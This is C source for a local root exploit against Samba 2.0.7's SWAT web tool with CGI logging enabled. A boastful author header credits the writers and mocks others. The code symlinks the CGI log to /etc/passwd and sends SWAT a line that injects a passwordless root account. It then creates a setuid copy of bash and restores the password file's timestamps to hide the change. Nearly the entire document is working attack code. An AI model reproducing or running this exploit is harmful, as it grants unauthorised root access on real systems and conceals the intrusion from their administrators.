/****************************************************************************\
**                                                                          **
**   Swat exploit for Samba 2.0.7 compiled with the cgi logging turned on   **
**                                                                          **
**   shell script version available for our friends, the self-proclaimed    **
**   security experts at corky.net (h4h32h4h4h4h4), using netcat, as they   **
**   deem more elegant than a self-contained exploit (ala this .c), l4m3    **
**   exploit by optyx <optyx@uberhax0r.net>                                 **
**   vulnerability discoverd by miah <miah@uberhax0r.net>                   **
**                                                                          **
**   on a side note, Just Marc rocks, so much, he doesn't set an sa pass    **
**   on his mysql server (doesn't take an elite hacker to use mysqlclient)  **
**   oh and a special message:                                              **
**   Hey babe, your hair's alright Hey babe, let's go out tonight (h4h4h)   **
**                                                                          **
\****************************************************************************/                  
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define REALLY_FUCKING_LONG_COMMAND "su uberhaxr -c \"cp -pdf /tmp/.bak \
/etc/passwd; chown root.root /etc/passwd; touch -fr /tmp/.bak /etc/passwd\""

int main(void) {

   int r, s;
   struct sockaddr_in s_addr;
   
   printf("backing up /etc/passwd\n");
   system("cp -pd /etc/passwd /tmp/.bak");
   system("touch -r /etc/passwd /tmp/.bak");

   if(system("/bin/ln -sf /etc/passwd /tmp/cgi.log") > 0) {
      printf("error, /tmp/cgi.log could not be linked to /etc/passwd\n");
      unlink("/tmp/.bak");
      exit(-1);
   }

   printf("connecting to swat\n");
   s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

   if(s < 0) {
      printf("error, could not create socket\n");
      unlink("/tmp/.bak");
      unlink("/tmp/cgi.log");
      exit(-1);
   }

   s_addr.sin_family = PF_INET;
   s_addr.sin_port = htons(901);
   s_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
   r = connect(s, (struct sockaddr *) &s_addr, sizeof(s_addr));

   if(r==-1) {
      printf("error, cannot connect to swat\n");
      unlink("/tmp/.bak");
      unlink("/tmp/cgi.log");
      exit(-1);
   }

   send(s, "uberhaxr::0:0:optyx r0x y3r b0x:/:/bin/bash\n", 1024, 0);
   close(s);

   if(system("su -l uberhaxr -c \"cp -f /bin/bash /tmp/.swat\"") > 0) {
      printf("exploit failed\n");
      unlink("/tmp/.bak");
      unlink("/tmp/cgi.log");
      exit(-1);
   }

   system("su -l uberhaxr -c \"chmod u+s /tmp/.swat\"");
   printf("restoring /etc/passwd\n");   
   system(REALLY_FUCKING_LONG_COMMAND);
   unlink("/tmp/.bak");
   unlink("/tmp/cgi.log");
   printf("got root? (might want to rm /tmp/.swat)\n");
   system("/tmp/.swat"); 
     
   return 0; 
}
